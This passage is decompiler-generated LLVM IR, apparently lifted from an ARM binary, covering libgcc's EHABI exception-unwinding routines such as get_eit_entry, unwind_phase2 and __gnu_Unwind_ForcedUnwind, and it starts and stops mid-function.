  %v0_192b4 = call i32 @abort()
  ret i32 %v0_192b4
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_192c0 = call i32 @abort()
  ret i32 %v0_192c0
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_192c4 = load i32, i32* @r4, align 4
  store i32 %v3_192c4, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r5.global-to-local, align 4
  %v4_192d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 132) to i32*), align 4
  %v2_192d8 = icmp eq i32 %v4_192d4, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_192e4 = add i32 %return_address, -2
  store i32 %v1_192e4, i32* %r4.global-to-local, align 4
  br i1 %v2_192d8, label %dec_label_pc_1931c, label %dec_label_pc_192ec

dec_label_pc_192ec:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_192d4)
  %v2_192fc = icmp eq i32 %v1_192e4, 0
  br i1 %v2_192fc, label %.thread, label %dec_label_pc_1933cthread-pre-split

.thread:                                          ; preds = %dec_label_pc_192ec
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_19304 = load i32, i32* %r6.global-to-local, align 4
  %v3_19304 = add i32 %v2_19304, 16
  %v4_19304 = inttoptr i32 %v3_19304 to i32*
  store i32 0, i32* %v4_19304, align 4
  br label %dec_label_pc_1930c

dec_label_pc_1930c:                               ; preds = %.thread, %.thread10, %dec_label_pc_194b4, %dec_label_pc_194a0, %dec_label_pc_1947c, %dec_label_pc_19454, %dec_label_pc_19354
  %v0_1930c = load i32, i32* %r2.global-to-local, align 4
  %v2_19314 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_19314, i32* @r4, align 4
  ret i32 %v0_1930c

dec_label_pc_1931c:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_19324 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 20) to i32*), align 4
  %v4_19328 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 48) to i32*), align 4
  store i32 %v4_19328, i32* %r2.global-to-local, align 4
  %v2_1932c = sub i32 %v4_19324, %v4_19328
  %v3_19330 = sdiv i32 %v2_1932c, 8
  store i32 %v3_19330, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1933c

dec_label_pc_1933cthread-pre-split:               ; preds = %dec_label_pc_192ec
  %v3_1933c.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_1933c

dec_label_pc_1933c:                               ; preds = %dec_label_pc_1933cthread-pre-split, %dec_label_pc_1931c
  %v0_19380.pre = phi i32 [ %v1_192e4, %dec_label_pc_1933cthread-pre-split ], [ %v4_19328, %dec_label_pc_1931c ]
  %v1_19344 = phi i32 [ %v3_1933c.pr, %dec_label_pc_1933cthread-pre-split ], [ %v3_19330, %dec_label_pc_1931c ]
  %v2_19340 = icmp eq i32 %v1_19344, 0
  br i1 %v2_19340, label %dec_label_pc_19354, label %dec_label_pc_19370.preheader

dec_label_pc_19370.preheader:                     ; preds = %dec_label_pc_1933c
  %v2_19344 = add i32 %v1_19344, -1
  %v1_193a0 = add i32 %v0_19380.pre, 8
  br label %dec_label_pc_19370.outer

dec_label_pc_19354.loopexit:                      ; preds = %dec_label_pc_193cc
  br label %dec_label_pc_19354

dec_label_pc_19354:                               ; preds = %dec_label_pc_19354.loopexit, %dec_label_pc_1933c, %dec_label_pc_19498
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1935c = load i32, i32* %r6.global-to-local, align 4
  %v2_1935c = add i32 %v1_1935c, 16
  %v3_1935c = inttoptr i32 %v2_1935c to i32*
  store i32 0, i32* %v3_1935c, align 4
  br label %dec_label_pc_1930c

dec_label_pc_19364:                               ; preds = %dec_label_pc_193c0
  %v3_19364 = icmp ult i32 %storemerge40, %v0_193c4
  br i1 %v3_19364, label %dec_label_pc_1936c, label %dec_label_pc_193dc

dec_label_pc_1936c:                               ; preds = %dec_label_pc_19364
  %v1_1936c = add nsw i32 %v3_19378, 1
  br label %dec_label_pc_19370.outer

dec_label_pc_19370.outer:                         ; preds = %dec_label_pc_1936c, %dec_label_pc_19370.preheader
  %v1_193cc.ph = phi i32 [ %v1_1936c, %dec_label_pc_1936c ], [ 0, %dec_label_pc_19370.preheader ]
  %v0_19370.ph = phi i32 [ %v0_19370, %dec_label_pc_1936c ], [ %v2_19344, %dec_label_pc_19370.preheader ]
  br label %dec_label_pc_19370

dec_label_pc_19370:                               ; preds = %dec_label_pc_19370.outer, %dec_label_pc_193d4
  %v0_19370 = phi i32 [ %v1_193d4, %dec_label_pc_193d4 ], [ %v0_19370.ph, %dec_label_pc_19370.outer ]
  %v2_19370 = add i32 %v0_19370, %v1_193cc.ph
  %tmp = icmp slt i32 %v2_19370, 0
  %v4_19374 = zext i1 %tmp to i32
  %v5_19374 = add i32 %v4_19374, %v2_19370
  %v3_19378 = sdiv i32 %v5_19374, 2
  %v3_1937c = mul i32 %v3_19378, 8
  store i32 %v3_1937c, i32* @ip, align 4
  %v2_19380 = add i32 %v3_1937c, %v0_19380.pre
  %v3_19380 = inttoptr i32 %v2_19380 to i32*
  %v4_19380 = load i32, i32* %v3_19380, align 4
  %v1_19384 = and i32 %v4_19380, 1073741824
  %v2_19384 = icmp eq i32 %v1_19384, 0
  %v2_19388 = or i32 %v4_19380, -2147483648
  %tmp79 = bitcast i32 %v4_19380 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_1938c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_19384, i32 %v2_1938c, i32 %v2_19388
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_19390 = icmp eq i32 %v2_19344, %v3_19378
  store i32 %v2_19380, i32* %r7.global-to-local, align 4
  br i1 %v9_19390, label %dec_label_pc_193c0, label %dec_label_pc_193a0

dec_label_pc_193a0:                               ; preds = %dec_label_pc_19370
  %v2_193a4 = add i32 %v3_1937c, %v1_193a0
  %v3_193a4 = inttoptr i32 %v2_193a4 to i32*
  %v4_193a4 = load i32, i32* %v3_193a4, align 4
  %v1_193ac = and i32 %v4_193a4, 1073741824
  %v2_193ac = icmp eq i32 %v1_193ac, 0
  %v2_193b0 = or i32 %v4_193a4, -2147483648
  %tmp81 = bitcast i32 %v4_193a4 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_193b4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_193ac, i32 %v2_193b4, i32 %v2_193b0
  %v1_193b8 = add i32 %v2_193a4, -1
  %v2_193bc = add i32 %storemerge39, %v1_193b8
  br label %dec_label_pc_193c0

dec_label_pc_193c0:                               ; preds = %dec_label_pc_19370, %dec_label_pc_193a0
  %storemerge40 = phi i32 [ %v2_193bc, %dec_label_pc_193a0 ], [ -1, %dec_label_pc_19370 ]
  %v2_193c0 = add i32 %storemerge, %v2_19380
  %v0_193c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_193c4 = icmp ult i32 %v0_193c4, %v2_193c0
  br i1 %v3_193c4, label %dec_label_pc_193cc, label %dec_label_pc_19364

dec_label_pc_193cc:                               ; preds = %dec_label_pc_193c0
  %v9_193cc = icmp eq i32 %v3_19378, %v1_193cc.ph
  br i1 %v9_193cc, label %dec_label_pc_19354.loopexit, label %dec_label_pc_193d4

dec_label_pc_193d4:                               ; preds = %dec_label_pc_193cc
  %v1_193d4 = add nsw i32 %v3_19378, -1
  br label %dec_label_pc_19370

dec_label_pc_193dc:                               ; preds = %dec_label_pc_19364
  %v2_193dc = load i32, i32* %v3_19380, align 4
  %v1_193e0 = and i32 %v2_193dc, 1073741824
  %v2_193e0 = icmp eq i32 %v1_193e0, 0
  %v2_193e4 = or i32 %v2_193dc, -2147483648
  %tmp83 = bitcast i32 %v2_193dc to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_193e8 = bitcast float %tmp84 to i32
  %v0_193ec = select i1 %v2_193e0, i32 %v2_193e8, i32 %v2_193e4
  %v2_193ec = add i32 %v0_193ec, %v2_19380
  %v1_193f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_193f0 = add i32 %v1_193f0, 72
  %v3_193f0 = inttoptr i32 %v2_193f0 to i32*
  store i32 %v2_193ec, i32* %v3_193f0, align 4
  %v0_193f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_193f4 = add i32 %v0_193f4, 4
  %v2_193f4 = inttoptr i32 %v1_193f4 to i32*
  %v3_193f4 = load i32, i32* %v2_193f4, align 4
  %v7_193f8 = icmp eq i32 %v3_193f4, 1
  br i1 %v7_193f8, label %.thread10, label %dec_label_pc_1940c

.thread10:                                        ; preds = %dec_label_pc_193dc
  %v1_193f8 = add i32 %v3_193f4, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_19404 = load i32, i32* %r6.global-to-local, align 4
  %v3_19404 = add i32 %v2_19404, 16
  %v4_19404 = inttoptr i32 %v3_19404 to i32*
  store i32 %v1_193f8, i32* %v4_19404, align 4
  br label %dec_label_pc_1930c

dec_label_pc_1940c:                               ; preds = %dec_label_pc_193dc
  %v1_1940c = icmp slt i32 %v3_193f4, 0
  br i1 %v1_1940c, label %.thread38, label %dec_label_pc_19424

.thread38:                                        ; preds = %dec_label_pc_1940c
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_19418 = load i32, i32* %r6.global-to-local, align 4
  %v5_19418 = add i32 %v4_19418, 76
  %v6_19418 = inttoptr i32 %v5_19418 to i32*
  store i32 %v1_193f4, i32* %v6_19418, align 4
  %v3_1941c = load i32, i32* %r2.global-to-local, align 4
  %v4_1941c = load i32, i32* %r6.global-to-local, align 4
  %v5_1941c = add i32 %v4_1941c, 80
  %v6_1941c = inttoptr i32 %v5_1941c to i32*
  store i32 %v3_1941c, i32* %v6_1941c, align 4
  br label %dec_label_pc_19444

dec_label_pc_19424:                               ; preds = %dec_label_pc_1940c
  %v1_19424 = and i32 %v3_193f4, 1073741824
  %v2_19424 = icmp eq i32 %v1_19424, 0
  %v2_19428 = or i32 %v3_193f4, -2147483648
  %tmp85 = bitcast i32 %v3_193f4 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_1942c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_19424, i32 %v2_1942c, i32 %v2_19428
  %v1_19430 = add i32 %storemerge42, 4
  %v2_19434 = add i32 %v1_19430, %v0_193f4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1943c = load i32, i32* %r6.global-to-local, align 4
  %v2_1943c = add i32 %v1_1943c, 76
  %v3_1943c = inttoptr i32 %v2_1943c to i32*
  store i32 %v2_19434, i32* %v3_1943c, align 4
  %v0_19440 = load i32, i32* %r2.global-to-local, align 4
  %v1_19440 = load i32, i32* %r6.global-to-local, align 4
  %v2_19440 = add i32 %v1_19440, 80
  %v3_19440 = inttoptr i32 %v2_19440 to i32*
  store i32 %v0_19440, i32* %v3_19440, align 4
  br label %dec_label_pc_19444

dec_label_pc_19444:                               ; preds = %.thread38, %dec_label_pc_19424
  %v0_19444 = load i32, i32* %r6.global-to-local, align 4
  %v1_19444 = add i32 %v0_19444, 76
  %v2_19444 = inttoptr i32 %v1_19444 to i32*
  %v3_19444 = load i32, i32* %v2_19444, align 4
  store i32 %v3_19444, i32* %r2.global-to-local, align 4
  %v1_19448 = inttoptr i32 %v3_19444 to i32*
  %v2_19448 = load i32, i32* %v1_19448, align 4
  %v1_1944c = icmp slt i32 %v2_19448, 0
  br i1 %v1_1944c, label %dec_label_pc_19470, label %dec_label_pc_19454

dec_label_pc_19454:                               ; preds = %dec_label_pc_19444
  %v1_19454 = and i32 %v2_19448, 1073741824
  %v2_19454 = icmp eq i32 %v1_19454, 0
  %v2_19458 = or i32 %v2_19448, -2147483648
  %tmp87 = bitcast i32 %v2_19448 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1945c = bitcast float %tmp88 to i32
  %v0_19460 = select i1 %v2_19454, i32 %v2_1945c, i32 %v2_19458
  %v2_19460 = add i32 %v0_19460, %v3_19444
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_19468 = add i32 %v0_19444, 16
  %v3_19468 = inttoptr i32 %v2_19468 to i32*
  store i32 %v2_19460, i32* %v3_19468, align 4
  br label %dec_label_pc_1930c

dec_label_pc_19470:                               ; preds = %dec_label_pc_19444
  %v3_19470 = udiv i32 %v2_19448, 16777216
  %v1_19474 = urem i32 %v3_19470, 16
  %v2_19474 = icmp eq i32 %v1_19474, 0
  br i1 %v2_19474, label %dec_label_pc_1947c, label %dec_label_pc_19490

dec_label_pc_1947c:                               ; preds = %dec_label_pc_19470
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_19484 = load i32, i32* %r5.global-to-local, align 4
  %v2_19484 = add i32 %v0_19484, -38120
  %v2_19488 = add i32 %v0_19444, 16
  %v3_19488 = inttoptr i32 %v2_19488 to i32*
  store i32 %v2_19484, i32* %v3_19488, align 4
  br label %dec_label_pc_1930c

dec_label_pc_19490:                               ; preds = %dec_label_pc_19470
  %v7_19490 = icmp eq i32 %v1_19474, 1
  br i1 %v7_19490, label %dec_label_pc_194b4, label %dec_label_pc_19498

dec_label_pc_19498:                               ; preds = %dec_label_pc_19490
  %v7_19498 = icmp eq i32 %v1_19474, 2
  br i1 %v7_19498, label %dec_label_pc_194a0, label %dec_label_pc_19354

dec_label_pc_194a0:                               ; preds = %dec_label_pc_19498
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_194a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_194a8 = add i32 %v0_194a8, -38136
  %v2_194ac = add i32 %v0_19444, 16
  %v3_194ac = inttoptr i32 %v2_194ac to i32*
  store i32 %v2_194a8, i32* %v3_194ac, align 4
  br label %dec_label_pc_1930c

dec_label_pc_194b4:                               ; preds = %dec_label_pc_19490
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_194bc = load i32, i32* %r5.global-to-local, align 4
  %v2_194bc = add i32 %v0_194bc, -38128
  %v2_194c0 = add i32 %v0_19444, 16
  %v3_194c0 = inttoptr i32 %v2_194c0 to i32*
  store i32 %v2_194bc, i32* %v3_194c0, align 4
  br label %dec_label_pc_1930c

; uselistorder directives
  uselistorder i32 %v1_19474, { 2, 1, 0 }
  uselistorder i32 %v0_19444, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_193f4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_193c4, { 1, 0 }
  uselistorder i32 %v3_1937c, { 2, 1, 0 }
  uselistorder i32 %v3_19378, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_19370, { 1, 0 }
  uselistorder i32 %v0_19370, { 1, 0 }
  uselistorder i32 %v2_19344, { 1, 0 }
  uselistorder i32 %v0_19380.pre, { 1, 0 }
  uselistorder i32 %v3_19330, { 1, 0 }
  uselistorder i32 %v1_192e4, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_19444, { 1, 0 }
  uselistorder label %dec_label_pc_193c0, { 1, 0 }
  uselistorder label %dec_label_pc_19370, { 1, 0 }
  uselistorder label %dec_label_pc_19354, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1930c, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_194cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_194cc:
  %v0_194cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_194cc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_194cc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_194cc, %bb
  %v10_194d4 = phi i32 [ %arg1, %dec_label_pc_194cc ], [ 0, %bb ]
  ret i32 %v10_194d4

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_194e8 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_194fc = inttoptr i32 %v1_194e8 to i32*
  %v2_194fc = load i32, i32* %v1_194fc, align 4
  store i32 %v2_194fc, i32* %r0.global-to-local, align 4
  %v12_194fc = add i32 %entry_vrs, 20
  %v1_19508 = inttoptr i32 %v12_194fc to i32*
  %v2_19508 = load i32, i32* %v1_19508, align 4
  store i32 %v2_19508, i32* %r0.global-to-local, align 4
  %v12_19508 = add i32 %entry_vrs, 36
  %v1_19510 = inttoptr i32 %v12_19508 to i32*
  %v2_19510 = load i32, i32* %v1_19510, align 4
  store i32 %v2_19510, i32* %r0.global-to-local, align 4
  %v12_19510 = add i32 %entry_vrs, 52
  store i32 %v12_19510, i32* @ip, align 4
  %v13_19514 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_19514, i32* @lr, align 4
  %v1_19518 = inttoptr i32 %v12_19510 to i32*
  %v2_19518 = load i32, i32* %v1_19518, align 4
  store i32 %v2_19518, i32* %r0.global-to-local, align 4
  %v9_19518 = add i32 %entry_vrs, 64
  %v10_19518 = inttoptr i32 %v9_19518 to i32*
  %v11_19518 = load i32, i32* %v10_19518, align 4
  store i32 0, i32* @r4, align 4
  %v1_19520 = add i32 %ucbp, 12
  %v2_19520 = inttoptr i32 %v1_19520 to i32*
  %v3_19520 = load i32, i32* %v2_19520, align 4
  store i32 %v2_19518, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_19538 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_19518)
  store i32 %v2_19538, i32* %r0.global-to-local, align 4
  %v0_1953c = load i32, i32* @r6, align 4
  %v1_1953c = load i32, i32* @r4, align 4
  %v9_1953c = icmp eq i32 %v0_1953c, %v1_1953c
  store i32 %v2_19538, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1953c, label %dec_label_pc_19550, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1955c

dec_label_pc_19550:                               ; preds = %entry
  store i32 %v0_1953c, i32* @r4, align 4
  br label %dec_label_pc_19558

dec_label_pc_19558:                               ; preds = %dec_label_pc_19620, %dec_label_pc_19550
  br label %dec_label_pc_1955c

dec_label_pc_1955c:                               ; preds = %.thread, %dec_label_pc_19558
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_19558 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1955c = icmp eq i32 %v2_19538, 0
  br i1 %v2_1955c, label %dec_label_pc_195d4, label %.thread2.dec_label_pc_19570_crit_edge

.thread2.dec_label_pc_19570_crit_edge:            ; preds = %dec_label_pc_1955c
  br label %dec_label_pc_19570

dec_label_pc_19570:                               ; preds = %.thread2.dec_label_pc_19570_crit_edge, %dec_label_pc_195d4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_19580 = load i32, i32* @r5, align 4
  store i32 %v0_19580, i32* @r3, align 4
  store i32 103824, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_19520)
  br i1 false, label %dec_label_pc_19598, label %dec_label_pc_195c0

dec_label_pc_19598:                               ; preds = %dec_label_pc_19570
  br i1 undef, label %dec_label_pc_195a0, label %dec_label_pc_195c4

dec_label_pc_195a0:                               ; preds = %dec_label_pc_19598
  br i1 undef, label %dec_label_pc_19620, label %dec_label_pc_195b8

dec_label_pc_195b8:                               ; preds = %dec_label_pc_195a0
  br i1 undef, label %dec_label_pc_19618, label %dec_label_pc_195c0

dec_label_pc_195c0:                               ; preds = %dec_label_pc_19570, %dec_label_pc_195b8
  br label %dec_label_pc_195c4

dec_label_pc_195c4:                               ; preds = %dec_label_pc_19598, %dec_label_pc_195c0
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_195d4:                               ; preds = %dec_label_pc_1955c
  store i32 %v11_19518, i32* @r3, align 4
  %v2_195d8 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_195d8, i32* @r4, align 4
  %v1_195dc = load i32, i32* @r5, align 4
  %v2_195dc = add i32 %v1_195dc, 20
  %v3_195dc = inttoptr i32 %v2_195dc to i32*
  store i32 %v11_19518, i32* %v3_195dc, align 4
  store i32 %v2_195d8, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_195ec = call i32 @memcpy()
  %v0_195f4 = load i32, i32* @r6, align 4
  store i32 %v0_195f4, i32* %r0.global-to-local, align 4
  %v0_195f8 = load i32, i32* @r5, align 4
  %v1_195fc = add i32 %v0_195f8, 16
  %v2_195fc = inttoptr i32 %v1_195fc to i32*
  %v3_195fc = load i32, i32* %v2_195fc, align 4
  store i32 %v3_195fc, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_195fc)
  %v0_1960c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1960c, i32* @r4, align 4
  br label %dec_label_pc_19570

dec_label_pc_19618:                               ; preds = %dec_label_pc_195b8
  br label %dec_label_pc_19620

dec_label_pc_19620:                               ; preds = %dec_label_pc_195a0, %dec_label_pc_19618
  br label %dec_label_pc_19558

; uselistorder directives
  uselistorder i32 %v11_19518, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 3, 7, 6, 1, 0, 5, 2, 9, 8, 4 }
  uselistorder i32* @r3, { 94, 95, 33, 34, 22, 96, 97, 25, 98, 99, 4, 100, 101, 102, 5, 103, 104, 105, 6, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 0, 124, 125, 126, 127, 23, 24, 26, 27, 28, 29, 30, 31, 32, 64, 50, 51, 52, 128, 129, 142, 143, 144, 132, 133, 134, 135, 136, 1, 137, 8, 36, 37, 130, 131, 63, 65, 66, 67, 68, 69, 70, 72, 71, 11, 12, 13, 148, 145, 146, 147, 2, 149, 150, 151, 35, 38, 39, 40, 41, 42, 43, 138, 139, 140, 141, 73, 74, 75, 76, 53, 77, 78, 10, 79, 80, 81, 82, 83, 84, 3, 14, 15, 16, 17, 18, 19, 20, 21, 44, 45, 46, 47, 48, 49, 54, 9, 55, 56, 57, 58, 59, 60, 61, 62, 85, 86, 87, 88, 89, 90, 7, 91, 92, 93 }
  uselistorder i32 10, { 1, 2, 37, 38, 39, 5, 51, 50, 86, 78, 52, 79, 0, 6, 40, 41, 11, 35, 36, 30, 4, 42, 31, 12, 32, 43, 13, 44, 14, 45, 15, 46, 16, 47, 17, 48, 49, 18, 19, 20, 21, 22, 23, 7, 53, 54, 55, 56, 57, 58, 59, 60, 61, 24, 62, 63, 64, 8, 65, 66, 67, 25, 9, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 26, 80, 3, 81, 82, 28, 83, 33, 34, 10, 84, 27, 85, 29 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_19620, { 1, 0 }
  uselistorder label %dec_label_pc_195c4, { 1, 0 }
  uselistorder label %dec_label_pc_195c0, { 1, 0 }
  uselistorder label %dec_label_pc_19570, { 1, 0 }
  uselistorder label %dec_label_pc_1955c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_19634 = add i32 %ucbp, 12
  %v3_19634 = inttoptr i32 %v2_19634 to i32*
  store i32 %stop_fn, i32* %v3_19634, align 4
  %v3_19638 = add i32 %ucbp, 24
  %v4_19638 = inttoptr i32 %v3_19638 to i32*
  store i32 %tmp, i32* %v4_19638, align 4
  %v1_1963c = add i32 %entry_vrs, 60
  %v2_1963c = inttoptr i32 %v1_1963c to i32*
  %v3_1963c = load i32, i32* %v2_1963c, align 4
  %v2_19644 = add i32 %entry_vrs, 64
  %v3_19644 = inttoptr i32 %v2_19644 to i32*
  store i32 %v3_1963c, i32* %v3_19644, align 4
  %v3_1964c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1964c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_196646 = add i32 %vrs, 64
  %v2_196647 = inttoptr i32 %v1_196646 to i32*
  %v3_196648 = load i32, i32* %v2_196647, align 4
  %v2_196689 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_196648)
  store i32 %v2_196689, i32* %r0.global-to-local, align 4
  %v2_1966c11 = icmp eq i32 %v2_196689, 0
  br i1 %v2_1966c11, label %dec_label_pc_19674, label %dec_label_pc_196a4

dec_label_pc_19674:                               ; preds = %entry, %dec_label_pc_19674.dec_label_pc_19660_crit_edge
  %v0_19674 = load i32, i32* @r5, align 4
  %v1_19674 = add i32 %v0_19674, 64
  %v2_19674 = inttoptr i32 %v1_19674 to i32*
  %v3_19674 = load i32, i32* %v2_19674, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1967c = load i32, i32* @r4, align 4
  %v2_1967c = add i32 %v1_1967c, 20
  %v3_1967c = inttoptr i32 %v2_1967c to i32*
  store i32 %v3_19674, i32* %v3_1967c, align 4
  %v0_19680 = load i32, i32* @r4, align 4
  %v1_19688 = add i32 %v0_19680, 16
  %v2_19688 = inttoptr i32 %v1_19688 to i32*
  %v3_19688 = load i32, i32* %v2_19688, align 4
  call void @__pseudo_branch(i32 %v3_19688)
  %v0_19694 = load i32, i32* %r0.global-to-local, align 4
  %v7_19694 = icmp eq i32 %v0_19694, 8
  br i1 %v7_19694, label %dec_label_pc_19674.dec_label_pc_19660_crit_edge, label %dec_label_pc_1969c

dec_label_pc_19674.dec_label_pc_19660_crit_edge:  ; preds = %dec_label_pc_19674
  %v0_19660.pre = load i32, i32* @r4, align 4
  %v0_19664.pre = load i32, i32* @r5, align 4
  store i32 %v0_19660.pre, i32* %r0.global-to-local, align 4
  %v1_19664 = add i32 %v0_19664.pre, 64
  %v2_19664 = inttoptr i32 %v1_19664 to i32*
  %v3_19664 = load i32, i32* %v2_19664, align 4
  %v2_19668 = call i32 @get_eit_entry(i32 %v0_19660.pre, i32 %v3_19664)
  store i32 %v2_19668, i32* %r0.global-to-local, align 4
  %v2_1966c = icmp eq i32 %v2_19668, 0
  br i1 %v2_1966c, label %dec_label_pc_19674, label %dec_label_pc_196a4

dec_label_pc_1969c:                               ; preds = %dec_label_pc_19674
  %v7_1969c = icmp eq i32 %v0_19694, 7
  br i1 %v7_1969c, label %dec_label_pc_196a8, label %dec_label_pc_196a4

dec_label_pc_196a4:                               ; preds = %entry, %dec_label_pc_19674.dec_label_pc_19660_crit_edge, %dec_label_pc_1969c
  %v0_196a4 = call i32 @abort()
  store i32 %v0_196a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_196a8

dec_label_pc_196a8:                               ; preds = %dec_label_pc_1969c, %dec_label_pc_196a4
  %v0_196a8 = load i32, i32* @r5, align 4
  %v1_196a8 = add i32 %v0_196a8, 4
  store i32 %v1_196a8, i32* %r0.global-to-local, align 4
  %v1_196ac = inttoptr i32 %v1_196a8 to i32*
  %v2_196ac = call i32 @__restore_core_regs(i32* %v1_196ac)
  store i32 %v2_196ac, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_196a8, { 1, 0 }
  uselistorder label %dec_label_pc_196a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19674, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_196b0 = add i32 %ucbp, 20
  %v2_196b0 = inttoptr i32 %v1_196b0 to i32*
  %v3_196b0 = load i32, i32* %v2_196b0, align 4
  %v1_196b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_196b8 = add i32 %v1_196b8, 64
  %v3_196b8 = inttoptr i32 %v2_196b8 to i32*
  store i32 %v3_196b0, i32* %v3_196b8, align 4
  %v1_196bc = add i32 %ucbp, 12
  %v2_196bc = inttoptr i32 %v1_196bc to i32*
  %v3_196bc = load i32, i32* %v2_196bc, align 4
  %v2_196c0 = icmp eq i32 %v3_196bc, 0
  store i32 %ucbp, i32* @r4, align 4
